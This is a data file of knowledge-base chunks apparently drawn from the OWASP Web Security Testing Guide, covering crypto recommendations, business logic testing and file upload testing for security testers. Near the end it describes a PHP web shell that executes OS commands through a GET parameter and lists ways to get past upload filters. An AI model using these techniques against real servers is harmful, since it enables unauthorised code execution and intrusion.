{"id": "kb-001503", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For asymmetric encryption, Elliptic Curve Cryptography (ECC) with secure curves like Curve25519 should be preferred. If ECC is not an option, RSA with a minimum key size of 2048 bits is recommended. PSS padding is recommended when using RSA for signatures. Weak hash/encryption algorithms such as MD5, RC4, DES, Blowfish, SHA1, 1024-bit RSA, and DSA should be avoided."}
{"id": "kb-001504", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Minimum key length requirements include: Diffie–Hellman key exchange with minimum 2048 bits, Message Integrity using HMAC-SHA2, Message Hash as SHA2 256 bits, Asymmetric encryption must be RSA 2048 bits, and Symmetric-key algorithms should use AES 128 bits."}
{"id": "kb-001505", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For password hashing, PBKDF2, Scrypt, and Bcrypt are recommended with PBKDF2 iterations recommended to be over 10,000; NIST suggests the same. When using symmetric encryption, CBC mode and ECB mode should not be utilized. In source code reviews, keywords such as MD4, MD5, RC4, DES, Blowfish, and SHA-1 should be searched to identify uses of weak algorithms."}
{"id": "kb-001506", "section": null, "tags": ["API", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "In Java implementations, the encryption API involves several key classes such as SecretKeyFactory, SecretKeySpec, and Cipher. For example, the Cipher class can be instantiated as follows: 'Cipher c = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");'"}
{"id": "kb-001507", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For RSA encryption, padding modes should be carefully selected. Suggested padding modes include 'RSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)' and 'RSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)'. It is important to note that using ECB is not advisable for padding."}
{"id": "kb-001508", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "When initializing encryption, a different Initial Vector (IV) must be employed for every encryption session to enhance security. For instance: 'byte[] newIv = ...; s = new GCMParameterSpec(s.getTLen(), newIv); cipher.init(..., s);'"}
{"id": "kb-001509", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The IvParameterSpec class can be used to check if the IV value is generated randomly. For example: 'IvParameterSpec iv = new IvParameterSpec(randBytes);'"}
{"id": "kb-001510", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "MessageDigest is used to implement hashing in Java, but weak hash algorithms like MD5 or CRC should be avoided. Example of a weak implementation is 'MessageDigest md5 = MessageDigest.getInstance(\"MD5\");'."}
{"id": "kb-001511", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For creating digital signatures, both SHA1 and MD5 should be avoided. For instance: 'Signature sig = Signature.getInstance(\"SHA1withRSA\");'."}
{"id": "kb-001512", "section": null, "tags": ["AUTHN", "CLIENT", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "PBKDF2 (Password-Based Key Derivation Function 2) is recommended for generating hash values of passwords, with at least 10,000 iterations and a random salt value. The implementation is shown as follows: 'private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes) throws NoSuchAlgorithmException, InvalidKeySpecException {...}'"}
{"id": "kb-001513", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The parameters used in the PBKDF2 function involve defining a key specification with iterations and salt, which are critical for strengthening password security. The use of a strong secret key factory is highlighted: 'SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);'"}
{"id": "kb-001514", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Vulnerability scanners such as Nessus, NMAP, or OpenVAS are valuable tools for identifying applications that utilize weak encryption protocols across several technologies including SNMP, TLS, SSH, and SMTP."}
{"id": "kb-001515", "section": null, "tags": ["AUTHN", "CLIENT", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Static code analysis tools like Klocwork, Fortify, Coverity, and CheckMark can be employed for source code review, particularly to identify weaknesses in cryptographic implementations such as: - CWE-261: Weak Cryptography for Passwords - refers to inadequate methods of securing passwords leading to potential breaches. - CWE-323: Reusing a Nonce, Key Pair in Encryption - indicates a security vulnerability where a nonce, which should be unique, is reused, jeopardizing encryption. - CWE-326: Inadequate Encryption Strength - highlights cases where the encryption method does not provide adequate security against brute force attacks. - CWE-327: Use of a Broken or Risky Cryptographic Algorithm - denotes the use of cryptographic algorithms that are known to be vulnerable. - CWE-328: Reversible One-Way Hash - designates insufficient hashing methods that can be reversed, compromising security. - CWE-329: Not Using a Random IV with CBC Mode - identifies the lack of a random initialization vector in cipher block chaining, which can lead to predictable ciphertext. - CWE-330: Use of Insufficiently Random Values - refers to weaknesses in the randomness of values used in encryption that can lead to vulnerabilities. - CWE-347: Improper Verification of Cryptographic Signature - emphasizes the importance of correctly verifying signatures to avoid unauthorized data access."}
{"id": "kb-001516", "section": null, "tags": ["CRYPTO", "INFO"], "source": "wstg-v4.2.pdf", "text": "- CWE-354: Improper Validation of Integrity Check Value - highlights the necessity for validating integrity checks to prevent data corruption. - CWE-547: Use of Hard-coded, Security-relevant Constants - is a warning about embedding security-related constants directly into code, making them susceptible to discovery. - CWE-780: Use of RSA Algorithm without OAEP - suggests that failing to implement Optimal Asymmetric Encryption Padding (OAEP) may lead to vulnerabilities in RSA encryption."}
{"id": "kb-001517", "section": null, "tags": ["AUTHN", "AUTHZ", "BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Business logic testing involves unconventional thinking, focusing on how the order of operations can be manipulated to exploit security vulnerabilities. For instance, skipping steps in an authentication process can reveal flaws in access control."}
{"id": "kb-001518", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Business logic flaws cannot be detected by automated vulnerability scanners; they depend on the creativity and skills of penetration testers."}
{"id": "kb-001519", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "These flaws can be particularly detrimental to an application, making their detection critical despite being under-studied in the security community."}
{"id": "kb-001520", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Manual testing of business logic flaws is essential, as their complexity often requires an understanding of the complete business process and its rules."}
{"id": "kb-001521", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Testers need to understand any limits or restrictions imposed by business functions to effectively analyze the application. Engaging with the business or developers can clarify intent and rules for the application. Automated tools struggle with understanding contextual logic, making manual testing necessary for exploring unique application behaviors."}
{"id": "kb-001522", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Example 1: An e-commerce website allows item selection, but a flaw exists if an attacker can manipulate pricing on the summary page by injecting a lower cost during a valid session, allowing them to complete a purchase at the incorrect price. Holding or locking resources can prevent unauthorized purchases, and implementing timeouts ensures correct pricing charges. A scenario illustrates the risk of loyalty points being unfairly accrued if a user cancels a transaction after points have been awarded."}
{"id": "kb-001523", "section": null, "tags": ["BUSINESS", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Tools for testing business processes cannot always detect logical vulnerabilities, which require human analysis to uncover circumventions in the process flow. Common tool types for identifying business logic issues include: 1. Intercepting Proxies (e.g., OWASP Zed Attack Proxy, Burp Proxy) allow testers to observe HTTP request and response blocks. 2. Web Browser Plug-ins (e.g., Tamper Data, Tamper Chrome) help view and alter HTTP/HTTPS headers and parameters."}
{"id": "kb-001524", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "3. Miscellaneous Test Tools (e.g., Web Developer toolbar, HTTP Request Maker, Cookie Editor) facilitate request manipulation and cookie management."}
{"id": "kb-001525", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The application must ensure that only logically valid data is entered at both the front end and server side, to avoid vulnerabilities to server injections through proxies or handoffs with other systems."}
{"id": "kb-001526", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Business logic data validation differs from Boundary Value Analysis (BVA) in that it focuses on logical conditions rather than just format checks."}
{"id": "kb-001527", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For instance, when validating a Social Security Number (SSN), it is not only necessary to check if the number is in the correct format (9 digits), but also to verify if it is logically sound, such as checking if the person is listed on a death file or if the SSN is appropriately categorized by geography."}
{"id": "kb-001528", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities related to business data validation are unique as they are application-specific and focus on logical data, rather than just breaking the business logic workflow."}
{"id": "kb-001529", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Both the front end and back end of an application should collaboratively validate and verify the logical integrity of the data being processed to prevent logic errors that could alter application behavior based on data conditions."}
{"id": "kb-001530", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Example 1 illustrates a multi-tiered e-commerce system whereby an attacker could exploit a situation where an in-stock item is falsely reported as out-of-stock and manipulate the order process, undermining business logic controls."}
{"id": "kb-001531", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example 2 highlights vulnerabilities in credit card systems where fast-paced transactions may allow users to exceed credit limits due to reliance on outdated account balances."}
{"id": "kb-001532", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example 3 describes a distributed denial of dollar (DDo$) campaign where the attacker exploited bank transfer design errors by making numerous small donations to increase operational costs for the target law firm after a threshold of free transactions was exceeded."}
{"id": "kb-001533", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test Objectives in Web Security Testing: - Identify data injection points. - Validate that all checks occur on the back end and can’t be bypassed. - Analyze how the application handles logically invalid data formats."}
{"id": "kb-001534", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Generic Test Method: - Review project documentation and conduct exploratory testing to find data entry points or hand-off points between systems. - Insert logically invalid data into the application to test its response."}
{"id": "kb-001535", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Specific Testing Method: - Perform front-end GUI functional validation to ensure only valid values are accepted by the application. - Use an intercepting proxy to observe HTTP POST/GET requests to find variables like cost and quality. - Look for potential injection or tamper points at hand-offs between applications/systems. - Test these variables with logically invalid data (e.g., non-existent social security numbers) to verify server responses and data validation."}
{"id": "kb-001536", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Related Test Cases: - All input validation test cases. - Testing for account enumeration and guessable user accounts. - Testing for bypassing session management schema. - Testing for exposed session variables."}
{"id": "kb-001537", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Remediation Point: - The application/system must ensure only \"logically valid\" data is accepted at all input and hand-off points and should not simply trust the data once it enters the system. Tools for Testing: - OWASP Zed Attack Proxy (ZAP). - Burp Suite."}
{"id": "kb-001538", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Forging requests is a technique used by attackers to send unauthorized HTTP requests to an application, circumventing its front-end interface and manipulating back-end processing."}
{"id": "kb-001539", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "The goal is to exploit vulnerabilities in the application's business logic, often involving manipulating parameters or accessing hidden features."}
{"id": "kb-001540", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "For forged requests, attackers may use intercepting proxies to send crafted HTTP POST/GET requests, aiming to make the application believe that certain processes have occurred."}
{"id": "kb-001541", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Unique vulnerabilities related to request forgery differ from typical data validation; they specifically target the business logic workflows. Applications should implement logic checks to reject forged requests to protect against exploitation of their business processes."}
{"id": "kb-001542", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Examples of forged requests include using hidden fields manipulated by the attacker to gain undue advantages, such as repeated discounts or accelerated game progress."}
{"id": "kb-001543", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "The term 'Easter egg' refers to secret features or messages intentionally included in software, which can also be exploited when hidden functionalities are accessible to attackers. Insert logically valid data can bypass normal business logic workflow."}
{"id": "kb-001544", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To test for guessable values, use an intercepting proxy to observe HTTP POST/GET requests for incrementing or easily guessable values, and consider altering these guesses to gain unauthorized visibility."}
{"id": "kb-001545", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Hidden options may be identified through similar proxy observations, looking for features like 'debug' that can be activated by guessing and altering values."}
{"id": "kb-001546", "section": null, "tags": ["CSRF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Related test cases include: Testing for Exposed Session Variables, Cross Site Request Forgery (CSRF), and Account Enumeration and Guessable User Accounts."}
{"id": "kb-001547", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Applications should be designed to prevent parameters from being predicted or manipulated to maintain programmatic integrity and business logic flow, thus protecting against exploitation of hidden functionality. Recommended tools for testing include OWASP Zed Attack Proxy (ZAP) and Burp Suite."}
{"id": "kb-001548", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Test Integrity Checks (ID: WSTG-BUSL-03)**: This section discusses the importance of integrity checks in web applications to prevent unauthorized submissions of data by users, particularly through hidden or non-editable fields."}
{"id": "kb-001549", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Key Concept**: Server-side controls must perform validations based on business logic to ensure that only appropriate and authorized data is processed.\n- For example, applications should maintain a server-side copy of essential values like quantity to prevent tampering by clients."}
{"id": "kb-001550", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Vulnerability Insight**: Business logic integrity check vulnerabilities are specific to applications, arising from misuse cases that enable users to change fields they shouldn't be able to modify, impacting the application's integrity."}
{"id": "kb-001551", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "**Example 1**: In an ASP.NET application, an admin user can change passwords, but a non-admin user might use a proxy to submit changes through hidden fields, tricking the system into allowing unauthorized access."}
{"id": "kb-001552", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Example 2**: A Project Management application presents dropdown lists based on user privileges. If an attacker finds an unauthorized project name and submits it via a proxy, they may bypass authorization checks."}
{"id": "kb-001553", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Example 3**: A motor vehicle administration system's integrity can be compromised if it moves online without maintaining the necessary verification checks, enabling attackers to insert unverifiable data that undermines data integrity. Logging is crucial for auditing and troubleshooting, but the integrity of log information can be compromised by attackers."}
{"id": "kb-001554", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test Objective: Review project documentation for data handling components, determine acceptable data types, and identify access permissions for data modifications."}
{"id": "kb-001555", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing Method 1 involves using a proxy to inspect HTTP traffic for hidden fields and testing the application by manipulating those values to circumvent business processes. Testing Method 2 also uses a proxy to find non-editable areas in the application where data can be inserted and tested for modifications."}
{"id": "kb-001556", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing Method 3 encourages listing application components affected by security risks, such as logs or databases, and performing actions to read or manipulate that data. Remediation involves implementing strict access controls for data modification and ensuring proper logging to prevent unauthorized access. Tools mentioned for testing include OWASP Zed Attack Proxy (ZAP) and Burp Suite, which aid in identifying security vulnerabilities."}
{"id": "kb-001557", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Attackers can gather information on an application by monitoring response times, potentially exposing vulnerabilities related to process timing."}
{"id": "kb-001558", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities related to process timing are categorized as manual misuse cases and should be tailored to the specific execution and transaction timings of the application."}
{"id": "kb-001559", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Processing timing may leak information about background processes within the application/system, enabling users to make educated guesses about upcoming outcomes and adjust their behavior to exploit the system—referred to as 'gaming the system'."}
{"id": "kb-001560", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example 1 illustrates how video gambling/slot machines may intentionally alter transaction processing times to signal optimal betting strategies to players, prompting them to increase bets based on observed delays before large payouts."}
{"id": "kb-001561", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Example 2 describes a login process where an attacker may discern valid usernames based on response times. If an invalid username/password combination returns an error more quickly than a valid username with an invalid password, it provides insight into valid user account existence."}
{"id": "kb-001562", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example of vulnerability in ticketing applications where seats can be reserved indefinitely by an attacker, potentially preventing legitimate sales, illustrating the need for time-limited transactions."}
{"id": "kb-001563", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In e-commerce contexts, an example is provided where delayed transaction completion could allow an attacker to benefit from fluctuating market prices, emphasizing the risks with pricing mechanisms linked to time."}
{"id": "kb-001564", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives include reviewing documentation for time-sensitive system functionalities and developing misuse cases as part of a thorough security testing approach. The importance of identifying time-dependent processes during web security testing, as these may allow certain controls to be bypassed."}
{"id": "kb-001565", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The recommendation to automate requests that exploit time-dependent processes, as tools are generally more accurate than manual testing in analyzing timing."}
{"id": "kb-001566", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The necessity of creating a flow diagram that outlines process flows and injection points to prepare for testing vulnerable processes effectively."}
{"id": "kb-001567", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "The significance of closing analysis after testing to identify any deviation from expected business logic, which may indicate vulnerabilities."}
{"id": "kb-001568", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Related test cases include testing for cookie attributes and session timeouts, both of which are crucial in establishing secure session management practices."}
{"id": "kb-001569", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies suggested include designing applications with consistent processing times to prevent attackers from exploiting timing information, and implementing mechanisms to restrict transaction durations to a specified timeframe. Testing the number of times a function can be used is essential to prevent users from exploiting application logic."}
{"id": "kb-001570", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Applications must restrict users from exceeding the allowable function calls, which can result in unintended benefits, such as applying discounts multiple times."}
{"id": "kb-001571", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example: An eCommerce site allowing only one discount per transaction should be tested to see if users can apply additional discounts by navigating back to the discounts page. Test objectives include identifying functions that require limits, assessing if logical limits are set, and validating those limits."}
{"id": "kb-001572", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing methodology involves reviewing project documentation, conducting exploratory testing, and developing misuse cases for functions that should be executed with limits."}
{"id": "kb-001573", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Abuse/misuse cases could include navigating back and forth through pages or manipulating session data to execute limited functions more than allowed."}
{"id": "kb-001574", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies include setting hard controls in the application to enforce limit restrictions, such as invalidating discounts at the database level or implementing counters per user."}
{"id": "kb-001575", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Definition of Workflow**: According to Wikipedia, a workflow is a sequence of connected steps where each step follows without delay and ends before the next step begins. It represents a sequence of operations, which could be the work of a person or a group."}
{"id": "kb-001576", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Workflow Vulnerabilities**: These vulnerabilities occur when an attacker can bypass the intended workflow of an application/system, enabling them to misuse the system."}
{"id": "kb-001577", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Business Logic Requirement**: An application’s business logic should enforce that users complete steps in a specific order, ensuring that if a workflow is interrupted, all actions are canceled."}
{"id": "kb-001578", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Specificity of Vulnerabilities**: Vulnerabilities related to work-flow circumvention are application/system specific, necessitating the development of careful misuse cases based on system requirements and use cases."}
{"id": "kb-001579", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "**Test Objective**: Validate the project documentation for alternate methods to navigate the application process erroneously, aiming to uncover potential logical and workflow bypass vulnerabilities."}
{"id": "kb-001580", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Example 1 - Loyalty Points System**: Users can exploit a loyalty points system by initiating a transaction that accrues points but subsequently canceling it, thus obtaining points without completing a purchase. The system should not grant points until the transaction is completed successfully or should roll back points if the transaction fails."}
{"id": "kb-001581", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Example 2 - Bulletin Board Profanity Filter**: An attacker may exploit the ability to edit a post after submission. If a profanity-checking mechanism only validates submissions initially, users can post initially compliant text and later edit it to include profanity, thus circumventing the filter."}
{"id": "kb-001582", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Testing Method 1**: Initiate a transaction that progresses through points in the application, especially those triggering user account credits/points, to check for potential circumvention vulnerabilities."}
{"id": "kb-001583", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing Method 2 involves interacting with content management systems to ensure that invalid data cannot be saved, which is crucial for maintaining data integrity."}
{"id": "kb-001584", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a test case is appending, editing, or removing data in a way that would result in an invalid state, particularly focusing on specific invalid inputs such as profanity or sensitive topics."}
{"id": "kb-001585", "section": null, "tags": ["PATH", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Related test cases in web security include testing for vulnerabilities such as directory traversal, unauthorized access, and session management issues."}
{"id": "kb-001586", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "The remediation suggests that applications should implement checks to ensure users follow the correct workflow, preventing attackers from exploiting workflow processes by skipping steps or performing actions out of order."}
{"id": "kb-001587", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "This highlights the importance of creating abuse/misuse cases to identify potential business logic errors, emphasizing the need for thorough testing of the application's business logic."}
{"id": "kb-001588", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test Defenses Against Application Misuse (ID: WSTG-BUSL-07): Focuses on identifying vulnerabilities in web applications through misuse of valid functionalities."}
{"id": "kb-001589", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The absence of active defenses allows attackers to exploit vulnerabilities undetected, leaving the application owner unaware of an ongoing attack."}
{"id": "kb-001590", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Example actions taken by an authenticated user attempting misuse include: accessing unauthorized files, substituting parameters, altering request types, duplicating parameters, and adding extraneous parameters."}
{"id": "kb-001591", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Effective application monitoring should respond to misuse bursts by implementing measures such as disabling critical functionality, adding authentication steps, applying time delays, and recording detailed user interaction data. Failure to respond to misuse indicates that the application lacks proper defenses against exploitation."}
{"id": "kb-001592", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives include documenting all tests, reviewing functionality changes in response to aggressive inputs, and verifying the adequacy of defensive measures against bypass techniques."}
{"id": "kb-001593", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for application misuse can utilize observations from other security tests to identify self-defense mechanisms like changed responses and blocked requests."}
{"id": "kb-001594", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Localized defenses in web security include rejecting certain input characters and temporarily locking out accounts after multiple authentication failures."}
{"id": "kb-001595", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Localized security controls are often insufficient against various types of misuse, such as forced browsing, input validation bypass, and access control errors. Additional issues include duplicate or missing parameter names and failures in input validation that are not typically user mistakes."}
{"id": "kb-001596", "section": null, "tags": ["SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "Common attack vectors include receiving invalid structured data formats, blatant cross-site scripting or SQL injection payloads, and abnormal user behavior like automation tool usage. Changes in user characteristics such as geo-location or user agent may indicate malicious activity."}
{"id": "kb-001597", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Web applications should actively monitor and respond to misuse attempts, with strong defenses typically required in authenticated sections of applications."}
{"id": "kb-001598", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A lack of monitoring or active response to testing actions may indicate insufficient security measures, leading testers to report vulnerabilities. Remediation suggests that applications implement defenses to protect against attackers and abusers."}
{"id": "kb-001599", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "The importance of validating file uploads in web applications, specifically regarding allowing only certain 'approved' file types to prevent potential security risks."}
{"id": "kb-001600", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Unexpected file types can be executed on a system and potentially allow attackers to engage in various harmful activities such as defacing websites, performing remote commands, or exploiting vulnerabilities."}
{"id": "kb-001601", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A distinction is made between uploading unexpected file types and uploading malicious files; the former can lead to detrimental outcomes even if the file itself isn't inherently malicious. Examples of dangerous file types may include .jsp, .exe, HTML files with scripts, which should not be processed by the application."}
{"id": "kb-001602", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives involve reviewing project documentation to identify rejected file types, ensuring that unwelcomed file types are handled safely, and verifying the security of batch uploads against set measures."}
{"id": "kb-001603", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing methodologies include examining logical requirements of the application, preparing a library of disallowed file types, and verifying upload mechanisms to ensure proper handling of these files."}
{"id": "kb-001604", "section": null, "tags": ["CLIENT", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Specific testing methods include checking whether the application performs adequate file type validation beyond just client-side checks, Content-Type validation, and ensuring scripts or code injections are not possible through uploaded files."}
{"id": "kb-001605", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "File Path Checking: This involves validating the file paths for uploaded files to prevent malicious users from uploading files to unintended locations."}
{"id": "kb-001606", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Example of Attack: Hackers may use ZIP files to compress files with specified paths, which, when unzipped, could lead to unauthorized file uploads."}
{"id": "kb-001607", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test Cases: Testing should include checking for sensitive information in files, as well as the ability to upload malicious files, ensuring that the system is resilient against such threats."}
{"id": "kb-001608", "section": null, "tags": ["API", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Remediation Strategies: Developers should implement mechanisms to restrict file uploads to only those that are acceptable, employing techniques like deny lists or allow lists for file extensions, checking the 'Content-Type' in headers, and utilizing file type recognizers to ensure only specific file types are processed by the application."}
{"id": "kb-001609", "section": null, "tags": ["API", "HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Best Practices: Maintaining security during file uploads by blocking malicious files is crucial. Following guidelines like those outlined in OWASP can aid in preventing security vulnerabilities related to file uploads. Many applications allow users to upload data, but adequate input validation for file uploads is more complex than for text-based inputs. Simple restrictions based on permitted or blocked file extensions are insufficient in preventing malicious uploads. Malicious files can exploit the application in unexpected ways depending on the application's architecture and the underlying systems. File types considered acceptable can vary greatly among different systems, meaning that malicious content is context-dependent."}
{"id": "kb-001610", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Malicious files can bypass security measures if not properly scanned during the upload process, potentially leading to the execution of exploits or shellcode."}
{"id": "kb-001611", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Detection and prevention of malicious file uploads can occur through various application architecture points, including IPS/IDS systems and antivirus scanning during the upload process."}
{"id": "kb-001612", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of this vulnerability is when a blog or forum permits users to upload images; if an attacker uploads an executable file (like a PHP script), they may gain unauthorized access to the server."}
{"id": "kb-001613", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing should include reviewing project docs for acceptable file types and determining how uploaded files are processed, along with attempting to upload pre-prepared malicious files for evaluation."}
{"id": "kb-001614", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Executing a malicious shell file on an Internet-facing server can lead to unauthorized code execution, making it crucial to configure the server properly to prevent such vulnerabilities."}
{"id": "kb-001615", "section": null, "tags": ["API", "AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Techniques to protect a shell file from unauthorized access include uploading it with a random name, password-protecting it, implementing IP-based restrictions, and ensuring its removal after use."}
{"id": "kb-001616", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a simple PHP-based shell is provided, which executes OS commands via a GET parameter, accessible only from a specified IP address."}
{"id": "kb-001617", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The PHP code example checks the request's remote host against a specified IP and allows command execution if there is a 'cmd' parameter in the request."}
{"id": "kb-001618", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "To test for filter evasion, it is essential to identify what filters are blocking or allowing inputs and where these filters are implemented (client-side vs server-side)."}
{"id": "kb-001619", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Common methods for bypassing server-side filters include changing the Content-Type header, altering file extensions to less common ones, modifying the capitalization of extensions, and using special trailing characters to manipulate file uploads."}
